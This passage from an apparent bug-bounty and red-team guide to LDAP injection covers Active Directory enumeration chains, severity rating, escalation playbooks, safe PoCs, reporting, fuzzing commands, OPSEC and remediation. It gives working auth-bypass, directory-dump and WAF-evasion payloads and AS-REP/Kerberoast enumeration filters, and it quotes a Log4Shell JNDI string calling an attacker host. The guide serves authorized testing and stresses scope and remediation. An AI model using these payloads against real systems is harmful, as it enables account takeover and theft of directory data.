> **If this → then that:** the WAF blocks a literal `*` → try **`%2a`**, **`%252a`** (double), or the **hex escape `\2a`** (apps that un-escape it hand you the metachar back). It blocks `(`/`)` → the **absolute-true `(&)`** payload needs only `&` and parens it often misses, or encode them. It strips trailing clauses → **`%00` truncation**. One layer at a time; confirm the filter logic still changes (§5).

---

# 15. Active Directory Deep + Red-Team Chains

AD is the most common LDAP backend behind enterprise login — and the richest post-injection target.

## 15.1 AD attribute cheat (what to enumerate / match on)
```
sAMAccountName        the logon name (AD's "uid")            → user enumeration / auth-bypass term.
userPrincipalName     user@domain                            → another logon form.
memberOf              groups the user is in                  → privilege graph (Domain Admins, etc.).
userAccountControl    account flags (bitmask)                → 0x2 disabled, 0x10000 DONT_EXPIRE,
                                                               0x400000 DONT_REQ_PREAUTH (→ AS-REP roasting).
servicePrincipalName  SPNs                                   → Kerberoasting targets.
objectSid / objectGUID identifiers.                          adminCount=1 → privileged/protected accounts.
```

## 15.2 Injection → enumeration → offline attacks (authorized red-team)
```
Find non-preauth users (AS-REP roast):  match (userAccountControl:1.2.840.113556.1.4.803:=4194304)  via injection/enum
                                         → list users with DONT_REQ_PREAUTH → request AS-REP → crack offline.
Find SPN users (Kerberoast):             match (servicePrincipalName=*) → service accounts → request TGS → crack offline.
Map privileged groups:                   enumerate memberOf / (adminCount=1) → who to target.
Once you can query directly (ldapsearch with a bind): windapsearch / ldapdomaindump / BloodHound for the full graph.
```
> **If this → then that:** an LDAP-injectable AD front-end (login/search) → enumerate **non-preauth** (`userAccountControl & 0x400000`) and **SPN** accounts → **AS-REP roasting / Kerberoasting** offline (no further hits on the target) → crack → domain foothold. This is the bug-bounty→red-team bridge: the injection is the *entry*, AD enumeration is the *escalation*. (Bug bounty: a single enumerated privileged username is enough proof — don't run the offline cracking against a live engagement unless it's in scope.)

> **Distinguish from Log4Shell / JNDI injection:** `${jndi:ldap://attacker/x}` (CVE-2021-44228) makes a vulnerable **logging** library *fetch and deserialize* a remote object → **RCE**. That is *JNDI/deserialization*, **not** LDAP **filter** injection — different bug, different kit (it's an input-→-logger sink, test it on the same fields but report it separately). LDAP *filter* injection edits a directory query; it does not, by itself, give RCE.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 16. The Validity-First Mindset

## 16.1 The four questions a triager asks (answer them in your report)
1. **Did filter logic actually change?** Show a controlled difference: `q=alice` → 1 row vs `q=*)(objectClass=*)` → all rows; or `user=admin)(&)` → logged in vs a normal wrong password → denied.
2. **What concrete impact?** Auth bypass / ATO, authorization bypass, mass PII/hash disclosure, or proven blind read. Name it.
3. **What does the attacker need?** Usually just an unauthenticated request to a login/search → low bar.
4. **Reproducible & in scope?** Exact endpoint/param, the payload, the before/after (rows, auth result, or oracle diff).

## 16.2 The "reflected `*` vs altered logic" rule (most important)
| You have | Verdict | Why / next |
|---|---|---|
| `*` echoed back in the page | Nothing yet | Reflection ≠ injection — need the *filter* to behave differently (§5). |
| `q=*)(objectClass=*)` returns the whole tree (vs 1 row) | **Injection → disclosure** | Logic changed; quantify rows (§10). |
| `user=admin)(&)` logs you in | **Auth bypass → ATO** | The headline (§9). |
| Group check forced always-true → admin feature | **Authz bypass → privesc** | High (§11). |
| Reliable true/false response diff on `)(uid=x)` | **Blind injection** | Extract a few benign chars to prove (§8/§12). |
| `(` throws an LDAP error, nothing else | Lead (error-based) | Fingerprint + build a breakout (§6/§7). |

## 16.3 Production-scope discipline
Prove on **production** with **your own test account** and a **bounded** read. Re-test blind oracles a few times to exclude noise. Validate any "extra rows" are genuinely beyond the intended search, not a legitimate wildcard feature. Re-test partial fixes (escaping `*` but not `(`/`)`, or filter-escaping but not the DN) — each is a fresh valid finding.

---

# 17. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **A `*` reflected in the response** | Reflection ≠ filter change. | The *filter* returns different entries (`*)(objectClass=*)` → all) (§5/§10). |
| 2 | **A 500 / LDAP error from `(`** | A crash is not exploitation by itself. | You then **alter logic** (widen / bypass / oracle) — error-based is a *lead* (§7). |
| 3 | **A built-in wildcard search feature** | The app *intends* `*` to match-all. | You exceed the intended scope (cross-OU, hidden attrs, auth/authz) (§10/§11). |
| 4 | **Username enumeration via different errors** | That's a separate (lower) bug. | You manipulate the filter, not just observe an error-message diff. |
| 5 | **A single noisy response-length blip** | Could be caching/jitter. | A **stable, repeatable** true-vs-false oracle (§8). |
| 6 | **JNDI/Log4Shell `${jndi:ldap://…}`** | That's deserialization RCE, not filter injection. | Report as its own bug; not this class (§15). |
| 7 | **"Login worked with `*`" but it's a demo/guest** | Not a real bypass. | You reach a **real** account/admin without its password (§9). |
| 8 | **Self-DoS via a huge wildcard / malformed filter** | Harmful, not a PoC. | N/A — use bounded, benign queries. |

> Rule of thumb: if you can't show the **directory's answer changed in your favor** (more/other entries, an auth/authz decision flipped, or a stable boolean oracle), you have a **reflected character or a crash, not LDAP injection.** Prove altered logic before reporting.

---

# 18. Severity Calibration — how triagers really rate LDAP injection

| Scenario | Typical | What moves it |
|---|---|---|
| **Auth bypass → log in as admin/privileged (ATO)** | **Critical** | Full account/admin takeover; the default top outcome. |
| **Auth bypass → log in as a normal user** | **High** | Account takeover, just not privileged. |
| **Authorization bypass / privilege escalation (forged group check)** | **High** | Access to admin features without membership. |
| **Full directory disclosure incl. readable `userPassword`/hashes** | **High–Critical** | Credentials/PII at scale. |
| **Full user/email/group disclosure (no hashes)** | **High–Medium** | Mass PII; severity scales with sensitivity. |
| **Blind char-by-char extraction of sensitive attributes** | **Medium–High** | Confirmed read; rate-limited but real. |
| **Error-based only (leaks structure, no logic change yet)** | **Low–Medium** | Information leak; escalate to logic change. |
| **Reflected `*` / a 500, no logic change** | **— (not a finding)** | Prove altered logic first. |

**CVSS / CWE:**
- Auth bypass → admin: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → ~9.1 (Critical) — or higher with `A`. **CWE-90** (LDAP Injection).
- Directory disclosure: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → ~7.5 (High).
- Anchor to **CWE-90** (Improper Neutralization of Special Elements used in an LDAP Query); parent **CWE-74** (Injection); add **CWE-287** (auth bypass) / **CWE-285** (improper authorization) for those outcomes.

---

# 19. Impact-Escalation Playbooks — "you found X, now do Y"

### 19.1 You found: *a `*` returns extra rows in a search*
- **Escalate:** force a full-tree match (`*)(objectClass=*)`), then match hidden attrs (`*)(memberOf=*)`, `*)(userPassword=*)`) to pull groups/hashes (§10).
- **Evidence:** before/after row counts; a bounded sample showing emails/groups (redacted).
- **Severity:** High (Critical if hashes readable).

### 19.2 You found: *`(` throws an LDAP error*
- **Escalate:** fingerprint the backend + base DN from the error (§7), then build the AND/OR breakout (§6) → auth bypass or disclosure.
- **Evidence:** the error text + the subsequent logic change.
- **Severity:** Low alone → High/Critical once you alter logic.

### 19.3 You found: *the login filter accepts `*` / `)(`*
- **Escalate:** auth-bypass payloads (`admin)(&)`, `*)(uid=*))(|(uid=*`); confirm which account you land on (§9).
- **Evidence:** logged-in session without the real password (your test-admin account).
- **Severity:** **Critical** (admin) / High (normal user).

### 19.4 You found: *no data, but responses differ true-vs-false*
- **Escalate:** build the boolean oracle, extract a few benign chars with `ldap_blind.py`, and run presence tests (`memberOf=*`) (§8/§12).
- **Evidence:** the stable oracle + a short extracted value on your test account.
- **Severity:** Medium–High.

### 19.5 You found: *a group/role check uses your (injectable) identifier*
- **Escalate:** force the membership filter always-true (`)(memberOf=*`, `)(&)`) → reach admin features (§11).
- **Evidence:** an admin-only action performed by a non-member test account.
- **Severity:** High.

### 19.6 You found: *an injectable AD front-end (red-team, in scope)*
- **Escalate:** enumerate non-preauth (`userAccountControl & 0x400000`) + SPN accounts → AS-REP/Kerberoast offline (§15).
- **Evidence:** an enumerated privileged username / SPN (proof-level; full cracking only if in scope).
- **Severity:** High → domain compromise in a red-team context.

---

# 20. Building a Professional, Safe PoC

```
DO:
  □ Prove altered LOGIC, not a reflected char: show q=alice (1 row) vs q=*)(objectClass=*) (all rows),
    OR user=admin)(&) logs in vs a wrong password is denied, OR a stable true/false oracle.
  □ Use YOUR OWN test account(s). For auth bypass, land on a test-admin you control, or stop at "logged in as <first entry>".
  □ For disclosure, read a BOUNDED sample (a handful of records) — enough to prove scope; redact real PII.
  □ For blind, extract a FEW characters of a benign attribute (your test user's mail/objectClass) — not the whole directory.
  □ Capture: exact endpoint/param, the payload, the before/after (row count / auth result / oracle diff), backend + base DN.
DON'T:
  □ Dump the entire directory or mass-extract real users' attributes (PII + legal risk; adds no bounty).
  □ Log into a REAL user's account and browse their data to "prove" the bypass — a benign login signal is enough.
  □ Run a malformed filter that DoSes the directory, or a wildcard that returns millions of rows.
  □ Report a reflected `*` or a lone 500 as "LDAP injection."
```
> The single most important restraint: **prove the directory's answer changed in your favor — once, benignly — and stop.** Auth bypass is already Critical; logging into real users or dumping the org adds risk, not reward. Same discipline as the SQLi/IDOR guides.

**Remediation to include:** never concatenate user input into a filter or DN — use the binding's **filter-assembly API with parameter escaping** (`ldap_escape($v, '', LDAP_ESCAPE_FILTER)` in PHP; `javax.naming` with proper encoding / a parameterized filter; `DirectorySearcher` with escaped values; `ldap3`/`python-ldap` filter builders). **Escape per context** — RFC 4515 for filters (`* ( ) \ NUL`), RFC 4514 for DNs (`, + " \ < > ; =`). **Validate/allowlist** expected input (username charset, no metacharacters). For login, **bind as the user** (search-then-bind with the *user's* password) rather than treating "≥1 entry matched" as success. Run the directory service account **least-privilege** (restrict which attributes/OUs the app can read so even a successful injection leaks little).

---

# 21. Reporting, CWE/CVSS & De-duplication

Use `LDAP_INJECTION_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "LDAP injection in <param> on <endpoint> → authentication bypass / directory disclosure" (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-90 (+ CWE-287 / CWE-285 for auth/authz outcomes)
3. Asset        exact endpoint/param/header + backend (AD/OpenLDAP) + base DN (if leaked) + context (AND/OR, filter/DN)
4. Summary      where input reaches the filter/DN, how you injected, what logic changed
5. Steps        numbered: the payload, the before/after evidence (row count / auth result / oracle diff)
6. PoC          the logged-in session (test account) / the widened result set (bounded) / the oracle + a short extract
7. Impact       auth bypass→ATO / authz bypass / mass disclosure — the "so what"
8. Remediation  escaping API + per-context escaping + allowlist + bind-as-user + least-privilege (§20)
```
**De-dup:** one filter/sink = one finding even if reachable via several params or breakout payloads; lead with the cleanest impact (prefer the auth bypass over the disclosure if both hit the same filter). Don't split "`*` returns extra rows" and "auth bypass" if they're the same sink. Distinct sinks (login vs search vs group-check) = distinct reports.

---

# 22. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
python3 poc/ldap_fuzz.py -u "https://target/search?q=FUZZ"             # special-char + breakout + result-count delta
python3 poc/ldap_blind.py -u "https://target/login" --method POST \
    --data "user=FUZZ&pass=x" --true "Welcome" --attr mail --target-uid testuser
nuclei -l live.txt -tags ldap -o ldap.txt                              # first-pass candidates
ffuf -u "https://target/search?q=FUZZ" -w ldap_breakouts.txt -mr "<all-users-marker>"
```
- **Quality gate:** never submit "the scanner flagged it." Reproduce by hand: show the **logic change** (rows / auth / oracle), confirm the **context** (AND/OR), and prove a **concrete impact** safely (§20).

**Stealth / OPSEC (authorized engagements):**
```
□ Blind extraction is REQUEST-HEAVY (≈ charset × length). Pace it (jitter + low concurrency) — a directory bind storm is loud
  and trips account-lockout/SIEM. Prefer >=/<= binary-search to cut request count ~log2.
□ Auth-bypass attempts can LOCK OUT the real account (failed-bind counters). Test against YOUR account; avoid hammering admin.
□ Error-based probing generates directory-server errors (logged). Keep it minimal once you've fingerprinted.
□ Second-order payloads fire later, possibly from a backend/admin context — note timing for the report.
```

**Red-team angles:**
```
□ LDAP auth bypass → admin portal → internal app foothold.
□ Directory disclosure → user/email list → password spraying / phishing target list (authorized).
□ AD enumeration via injection → non-preauth/SPN accounts → AS-REP/Kerberoast offline → domain (§15).
□ Authz forgery (memberOf always-true) → privileged features without group membership.
□ Second-order: poison a stored profile attribute consumed by an admin search/sync running with higher privilege (§13).
□ Chain: LDAP disclosure of internal hostnames/service accounts → feed SSRF/recon kits.
```

---

# Appendix A — LDAP-Injection Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                     LDAP INJECTION WORKFLOW                       │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: every LDAP feature (login / search / group-check) +     │
│    fingerprint AD vs OpenLDAP (attrs + errors)            §3/§1    │
│ 1. BASELINE ★ : normal value, then ONE *, then ONE ( →            │
│    error? more rows? auth diff? silent(blind)?            §4       │
│ 2. DETECT:                                                        │
│    special chars * ( ) & | ! \ %00 §5 · AND-vs-OR breakout §6 ·   │
│    error-based + fingerprint §7 · blind boolean oracle §8        │
│ 3. IMPACT ⭐ :                                                      │
│    AUTH BYPASS  user=admin)(&) / *)(uid=*))(|(uid=* ... §9 ⭐⭐⭐  │
│    DISCLOSURE   q=*)(objectClass=*) → whole tree ....... §10 ⭐⭐   │
│    AUTHZ/PRIVESC )(memberOf=* / )(&) ................... §11 ⭐    │
│    BLIND EXFIL  (&(uid=x)(attr=a*)) char-by-char ...... §12       │
│    DN / second-order .................................. §13       │
│    AD chains → AS-REP / Kerberoast (red-team) ......... §15       │
│ 4. EVADE (if WAF): %2a / %252a / \2a / (&) / %00 ...... §14       │
│ 5. VALIDATE → REPORT:                                            │
│    FP filter §17 (reflected * ≠ logic change; lone 500)          │
│    CVSS + CWE-90 (+287/285) §18                                  │
│    SAFE PoC: own test accts, bounded read, no mass dump §20      │
│    title = impact, dedup §21                                     │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — LDAP-Injection Decision Tree

```
Injected * / ( / )( into the param (§4/§5) →
│
├─ A wildcard returns MORE/OTHER entries (vs a specific value)? → DISCLOSURE. quantify + pull memberOf/userPassword (§10). HIGH ⭐
│
├─ A login filter logs you in with * / )( / (&) ? → AUTH BYPASS. which account? admin→CRITICAL, user→HIGH (§9) ⭐⭐⭐
│
├─ A group/role check uses your (injectable) id? → force memberOf always-true → AUTHZ/PRIVESC. HIGH (§11)
│
├─ No data, but )(uid=alice) vs )(uid=nobody) give DIFFERENT responses? → BLIND oracle.
│     └─ extract a few benign chars (ldap_blind.py); presence-test memberOf/userPassword (§8/§12). MED–HIGH
│
├─ ( throws an LDAP error, nothing else yet? → ERROR-BASED. fingerprint backend+base DN (§7), build AND/OR breakout (§6).
│
├─ Input escaped in the filter but used to build a DN? → DN injection: test , + = \ (§13).
│
├─ Payload blocked by a WAF? → evade: %2a / %252a / \2a / (&) absolute-true / %00 truncation (§14), retry detection.
│
└─ Only a reflected * / a lone 500 / a built-in wildcard feature? → NOT proven. Show altered LOGIC first (§17).

ALWAYS: prove the directory's answer changed in your favor (rows / auth / oracle), once & benignly on YOUR test account, then STOP (§20).
```

---

# Appendix C — LDAP Filter Syntax & Escaping Reference

```
FILTER (RFC 4515) operators:
  (&(A)(B))  AND      (|(A)(B))  OR      (!(A))  NOT
  (a=v) eq   (a>=v) ge   (a<=v) le   (a~=v) approx   (a=*) presence/wildcard   (a=x*y) substring
  (&) ABSOLUTE TRUE (matches all)        (|) ABSOLUTE FALSE (matches none)      — RFC 4526

FILTER metacharacters that must be ESCAPED in a value (else injectable):
  *  →  \2a        (  →  \28        )  →  \29        \  →  \5c        NUL → \00

DN (RFC 4514) special characters (different set — matters for DN injection §13):
  ,  +  "  \  <  >  ;  =      and a leading/trailing space, and a leading #
  (escaped with a backslash: \,  \+  \=  …)

URL-ENCODING for sending payloads:
  * %2a    ( %28    ) %29    \ %5c    & %26    | %7c    = %3d    ! %21    NUL %00    space %20
  double-encode when a decode happens before the filter:  * %252a    ( %2528

HIGH-VALUE ATTRIBUTES to match/extract:
  OpenLDAP/inetOrgPerson: uid cn sn mail userPassword telephoneNumber gidNumber memberOf objectClass description
  Active Directory:       sAMAccountName userPrincipalName memberOf userAccountControl servicePrincipalName
                          objectSid adminCount distinguishedName
```

---

# Appendix D — Important Links

**Always-on core (every kit):**
```
PortSwigger — LDAP injection (topic + lab)            https://portswigger.net/web-security/ldap-injection
PortSwigger Research                                  https://portswigger.net/research
OWASP — LDAP Injection                                https://owasp.org/www-community/attacks/LDAP_Injection
OWASP WSTG — Testing for LDAP Injection (WSTG-INPV-06) https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
OWASP — LDAP Injection Prevention Cheat Sheet         https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
PayloadsAllTheThings — LDAP Injection                 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
HackTricks — LDAP injection                           https://book.hacktricks.xyz/pentesting-web/ldap-injection
The Hacker Recipes — Active Directory / LDAP          https://www.thehacker.recipes/
PentesterLab — LDAP / authentication exercises        https://pentesterlab.com/
```

**Class-specific research & tradecraft (blind-LDAP + Active Directory chains, §8/§12/§15):**
```
Chema Alonso, Palazón, Guzmán, Parada — "LDAP Injection & Blind LDAP Injection" (the seminal blind-LDAP
    whitepaper, Black Hat Europe 2008 — read this once; the char-by-char oracle clicks afterward)
                                                      https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
SpecterOps — BloodHound (AD attack-path graph)        https://github.com/BloodHoundAD/BloodHound
harmj0y (Will Schroeder) — Kerberoasting / AS-REP roasting deep-dives   https://blog.harmj0y.net/
SpecterOps blog — "Roasting" AD (Kerberoast / AS-REP) https://posts.specterops.io/
windapsearch · ldapdomaindump (post-bind AD enum)     https://github.com/ropnop/windapsearch · https://github.com/dirkjanm/ldapdomaindump
MITRE ATT&CK — T1087 Account Discovery · T1558.003 Kerberoasting · T1558.004 AS-REP Roasting   https://attack.mitre.org/
Appliance "authentication bypass" CVEs (Citrix/Fortinet/Pulse — often LDAP/filter logic)   https://nvd.nist.gov/
```

**Standards & scoring:**
```
RFC 4515 (string filters) · RFC 4514 (DN) · RFC 4526 (absolute true/false)   https://www.rfc-editor.org/
CWE-90 (LDAP Injection) · CWE-74 (Injection) · CWE-287 (auth bypass) · CWE-285 (authorization)   https://cwe.mitre.org/data/definitions/90.html
CVSS 3.1 calculator                                   https://www.first.org/cvss/calculator/3.1
```

---

> **Final reminder — the one rule that pays:** *LDAP injection edits the directory's question — the only thing that matters is whether you changed its answer in your favor.* Detect by sending `*` and `(` and watching for more rows, a flipped auth/authz decision, or a stable true/false oracle; get the **AND-vs-OR context** right to break out; then prove the impact — **log in as admin** (`user=admin)(&)`), **dump the directory** (`q=*)(objectClass=*)`), or **read attributes char-by-char** — once, benignly, on your own test account, and stop. That's how a "corporate login" becomes the Critical it's worth.
